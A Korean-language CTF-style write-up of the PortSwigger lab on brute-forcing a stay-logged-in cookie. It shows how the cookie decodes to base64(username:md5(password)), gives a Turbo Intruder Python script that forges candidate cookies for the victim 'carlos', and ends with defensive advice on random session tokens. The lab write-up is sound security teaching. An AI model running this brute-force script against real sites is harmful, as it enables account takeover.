+++
date = '2026-07-10T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Brute-forcing a stay-logged-in cookie'
summary = "stay-logged-in 쿠키가 base64(username:md5(password)) 구조임을 밝혀, 비밀번호 후보를 같은 방식으로 인코딩해 대입함으로써 피해자 계정에 로그인하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Session Management", "Brute Force", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

> ![image.png](/writeup/portswigger/authentication/09/1.png)

이 랩은 "로그인 상태 유지" 기능을 제공하는 쿠키가 브루트포스에 취약하다. 브루트포스로 `carlos`의 쿠키를 만들어 계정 페이지에 접근하면 문제가 해결된다. 실습 계정은 `wiener:peter`, 대상 계정은 `carlos`이며 [password 후보](https://portswigger.net/web-security/authentication/auth-lab-passwords)가 주어진다.

### Authentication 진단

로그인 화면에 **Stay logged in** 체크박스가 있다.

![image.png](/writeup/portswigger/authentication/09/2.png)

이를 체크하고 로그인하면 응답에 장기 만료 쿠키가 설정된다.

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=iL2p6MqUtAGbaGmcCi8OwxXXonfuJRrW; Secure; HttpOnly; SameSite=None
Content-Length: 0
```

`stay-logged-in` 값을 base64로 디코딩하면 `wiener:51dc30ddc473d43a6011e9ebba6ca770`이 나온다. 앞은 username, 뒤는 32자 16진수 — MD5 해시로 보인다. 실습 비밀번호 `peter`를 MD5로 해싱하면 정확히 `51dc30ddc473d43a6011e9ebba6ca770`이 된다.

즉 쿠키 구조는 다음과 같다.

```text
stay-logged-in = base64( username + ":" + md5(password) )
```

쿠키가 **자격증명에서 결정론적으로 유도**되므로, 비밀번호만 맞히면 쿠키를 통째로 만들어 낼 수 있다.

---

## 익스플로잇

`carlos`에 대해, 비밀번호 후보를 MD5로 해싱하고 `carlos:<md5>` 형태로 조립한 뒤 base64로 인코딩해 `stay-logged-in` 쿠키에 실어 요청하는 스크립트를 구성한다.

```python
import hashlib
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=50,
                           pipeline=False
                           )

    for word in open(r'C:/Users/cas/Desktop/CAS/asset/word.txt'):
        pw = word.rstrip().encode('utf-8')
        pw_md5 = hashlib.md5(pw).hexdigest()
        cookie = 'carlos:' + pw_md5
        cookie_b64 = base64.b64encode(cookie.encode('utf-8')).decode('utf-8')
        engine.queue(target.req, cookie_b64)

def handleResponse(req, interesting):
    table.add(req)
```

공격 대상 요청은 다음과 같다. 세션 쿠키 없이 `stay-logged-in`만으로 계정 페이지 접근을 시도한다.

```http
GET /my-account?id=carlos HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: stay-logged-in=%s
```

결과에서 `Y2FybG9zOjZmNGVjNTE0ZWVlODRjYzU4YzhlNjEwYTBjODdkN2Ey` 쿠키가 200 응답을 돌려주며 `/my-account`가 바로 열린다. 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/09/3.png)

![image.png](/writeup/portswigger/authentication/09/4.png)

---

## 정리

이 랩의 결함은 세션 유지 토큰이 **난수가 아니라 자격증명의 함수**라는 데 있다. `base64(username:md5(password))`는 인코딩·해시를 겹쳤을 뿐 비밀이 아니다. base64는 가역이고 MD5는 솔트 없는 고속 해시라, 공격자는 후보 비밀번호로 동일한 쿠키를 오프라인에서 재현해 서버에 던져 볼 수 있다. 즉 쿠키가 비밀번호 브루트포스를 로그인 rate limit 밖에서 수행하게 해 주는 통로가 된다.

"로그인 유지" 토큰은 그 자체가 비밀번호를 대신하는 장기 인증 수단이므로, **추측 불가능한 난수**로 발급하고 서버 측에 사용자와의 매핑을 저장해야 한다. 토큰에서 사용자 정보를 역산할 수 없어야 하고, 비밀번호가 바뀌면 무효화되어야 한다. 값을 자격증명에서 유도하는 순간, 세션 유지 기능이 로그인 방어를 통째로 우회하는 뒷문이 된다.

이 랩과 같은 쿠키 구조에 XSS가 결합되면, 쿠키를 탈취한 뒤 오프라인에서 해시를 크랙해 평문 비밀번호까지 복원할 수 있다. 그 확장이 [offline password cracking](/write-up/portswigger/authentication/write-up-portswigger---offline-password-cracking/)이다.
